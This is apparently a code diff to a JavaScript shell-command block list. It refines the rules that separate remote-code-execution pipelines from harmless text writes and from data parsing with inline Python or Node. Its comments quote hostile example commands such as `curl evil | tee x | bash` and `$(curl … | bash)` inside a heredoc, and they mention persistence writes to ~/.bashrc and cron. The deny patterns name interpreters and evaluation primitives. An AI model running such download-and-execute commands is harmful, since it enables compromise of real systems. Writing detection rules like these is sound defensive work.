@@ -44,7 +44,13 @@ function pipeDownloadIsExternal(cmd) {
 // glue into a new one. Bounded, non-backtracking pieces — see bench/redos.mjs.
 function shellSkeleton(cmd) {
   return String(cmd)
-    .replace(/<<-?\s*(['"]?)([A-Za-z_]\w{0,30})\1[\s\S]*?^[ \t]*\2[ \t]*$/gm, ' <<HEREDOC ')
+    // A heredoc whose delimiter is UNQUOTED expands its body like a double-quoted
+    // string: `cat > note.md <<EOF` with `$(curl … | bash)` inside runs that pipeline
+    // before cat ever sees the text. Only a quoted delimiter, or a body with no
+    // substitution, is inert; anything else stays visible to the rules. The rest of
+    // the opening line is shell, not body (`cat <<'EOF' | sh` pipes the body into a
+    // shell), so only the lines after it are blanked.
+    .replace(/<<-?\s*(['"]?)([A-Za-z_]\w{0,30})\1([^\n]*)\n[\s\S]*?^[ \t]*\2[ \t]*$/gm, (m, q, _tag, line) => (!q && /\$\(|`/.test(m) ? m : ' <<HEREDOC ' + line))
     .replace(/'[^']{0,4000}'/g, " '' ")
     // A DOUBLE-quoted span containing $(…) or a backtick EXECUTES that
     // substitution before the string is ever used, so it is NOT inert text —
@@ -65,17 +71,66 @@ function shellSkeleton(cmd) {
 //   - the skeleton still pipes or chains  → `echo "…" | bash` genuinely feeds the
 //     text to a shell, and `echo "…" > x.sh && sh x.sh` runs it on the next clause
 //   - an interpreter sits in the skeleton → `bash -c "…"`, `python <<EOF`
-// Only then, and only for a lone text sink with a redirect, is it prose.
+// Only then, and only when every clause is the text sink itself or a plain sibling
+// (`cd dir && cat >> notes.md <<'EOF' … EOF`, then `echo saved`), is it prose.
 // Persistence targets are unaffected: a write to ~/.bashrc or cron is caught by
 // the rule on its *destination*, whatever the content happens to say.
 const TEXT_SINK_RE = /^\s*(?:echo|printf|cat|tee)\b[^;&|]{0,200}?(?:>>?\s*\S+|<<HEREDOC)/;
 const INTERP_WORD_RE = /\b(?:(?:ba)?sh|zsh|dash|ash|ksh|python[0-9.]*|node|ruby|perl|php|eval|source|xargs)\b/i;
+// Siblings move around, print or check; none can run a file or read text as a program.
+const PROSE_SIBLING_RE = /^\s*(?:cd|pwd|ls|mkdir|echo|printf|true|date|wc|test|\[)(?:\s|$)/;
 function isProseAboutACommand(cmd) {
   const skel = shellSkeleton(cmd);
   if (PIPE_INTERP.test(skel)) return false;    // shape outside quotes → real pipeline
-  if (/[;|]|&&/.test(skel)) return false;      // any pipe/chain → the text may be executed
   if (INTERP_WORD_RE.test(skel)) return false; // interpreter in command position
-  return TEXT_SINK_RE.test(skel);
+  if (/(?:^|[^|])\|(?!\|)/.test(skel)) return false; // a pipe → the text may be fed to something
+  if (/(?:^|[\s;&(])\.\s+\S|\.\/|\bchmod\b|\bexec\b/.test(skel)) return false; // runs a file
+  const clauses = skel.split(/&&|\|\||;|\n/).map((c) => c.trim()).filter(Boolean);
+  return clauses.some((c) => TEXT_SINK_RE.test(c)) &&
+    clauses.every((c) => TEXT_SINK_RE.test(c) || PROSE_SIBLING_RE.test(c));
+}
+
+// A download piped into a language interpreter that is given its program INLINE
+// (`python3 -c "…"`, `node -e "…"`) reads the download as DATA: parsing a JSON
+// API response is the everyday case. It is remote code execution only when the
+// inline program runs what it reads, so the exemption holds only for Python and
+// Node, only when the inline code uses no primitive that evaluates, imports,
+// opens or spawns (exec, eval, getattr, __import__, require, Function, …), and
+// only when nothing else in the command routes into an interpreter.
+// The program is one quoted word: single-quoted, or double-quoted with its escapes.
+const INLINE_INTERP_G = /\|\s*(python[0-9.]*|node)\s+((?:-[A-Za-z]{1,3}\s+){0,4})(?:-c|-e|-p|--eval|--print)\s+(?:"((?:[^"\\]|\\[\s\S]){1,4000})"|'([^']{1,4000})')/gi;
+// Python: builtins that run or reach code, any dunder, and imports outside a short
+// list of data-only modules (a module such as pdb, timeit or cProfile runs a string).
+const PY_EVALS = /\b(?:exec|eval|compile|execfile|getattr|setattr|delattr|globals|locals|vars|breakpoint|input|open|help|memoryview)\b|__/;
+const PY_SAFE_MODULES = new Set(['sys', 'json', 'csv', 're', 'math', 'statistics', 'datetime', 'time', 'collections', 'itertools', 'functools', 'operator', 'string', 'textwrap', 'hashlib', 'decimal', 'fractions', 'pprint', 'unicodedata', 'urllib.parse', 'ipaddress', 'uuid']);
+const pyImportsSafe = (code) => {
+  for (const m of code.matchAll(/\bfrom\s+([\w.]+)\s+import\b|\bimport\s+([\w.]+(?:\s+as\s+\w+)?(?:\s*,\s*[\w.]+(?:\s+as\s+\w+)?)*)/g)) {
+    const mods = m[1] ? [m[1]] : m[2].split(',').map((s) => s.trim().split(/\s+/)[0]);
+    if (!mods.every((x) => PY_SAFE_MODULES.has(x))) return false;
+  }
+  return true;
+};
+// Node: anything that evaluates, loads or spawns, computed property access, and any
+// part of `process` beyond its streams, argv, env and exit.
+const JS_EVALS = /\b(?:eval|Function|require|import|vm|child_process|constructor|globalThis|global|Reflect|Proxy|module|exports|setTimeout|setInterval|setImmediate|queueMicrotask|fs|spawn|exec|execSync|execve|Worker|WebAssembly|Bun|Deno)\b|\[\s*['"`]|\bprocess\s*\.\s*(?!(?:stdin|stdout|stderr|argv|env|exit|exitCode)\b)\w/;
+const inlineIsData = (interp, code) =>
+  /^python/i.test(interp) ? !PY_EVALS.test(code) && pyImportsSafe(code) : !JS_EVALS.test(code);
+function pipesOnlyIntoInlineData(cmd) {
+  let found = false;
+  const rest = String(cmd).replace(INLINE_INTERP_G, (m, interp, _flags, dq, sq) => {
+    // a double-quoted program is expanded by the shell first: any $ or backtick in it
+    // means the program text is not what is written here
+    if (dq !== undefined && /[$`]/.test(dq)) return m;
+    const code = dq !== undefined ? dq.replace(/\\([\s\S])/g, '$1') : sq;
+    if (!inlineIsData(interp, code)) return m;
+    found = true;
+    return '| cat ';
+  });
+  if (!found) return false;
+  // Whatever is left must hold no other route to an interpreter, plain or disguised.
+  if (PIPE_INTERP.test(rest) || PIPE_INTERP.test(neutralizeQuotedData(rest))) return false;
+  if (/\$\{?IFS|\$\(|`|\beval\b|\bsource\b|\{[^}\s]*,[^}\s]*\}/.test(rest)) return false;
+  return true;
 }
 
 // Windows flag/value separator. PowerShell's -ArgumentList takes an ARRAY, so the
@@ -132,7 +187,7 @@ export const BLACK_SHELL = [
   // [^;\n]* (not [^|]*) so a download piped THROUGH filters (tee/gunzip/sed/xxd/
   // tac/rev) into an interpreter — `curl evil | tee x | bash` — is still caught,
   // staying within one pipeline (no ; to a separate command).
-  { re: PIPE_INTERP, why: 'pipe remote download to an interpreter (RCE)', gate: (cmd) => pipeDownloadIsExternal(cmd) && !isProseAboutACommand(cmd) },
+  { re: PIPE_INTERP, why: 'pipe remote download to an interpreter (RCE)', gate: (cmd) => pipeDownloadIsExternal(cmd) && !isProseAboutACommand(cmd) && !pipesOnlyIntoInlineData(cmd) },
   // recursive chmod of the root/system tree — any mode is destructive there:
   // 777 opens it world-writable, 000 locks even root out. Reuses the rm rule's
   // target clause so a benign deploy `chmod -R 755 /home/app/dist` (deep path)
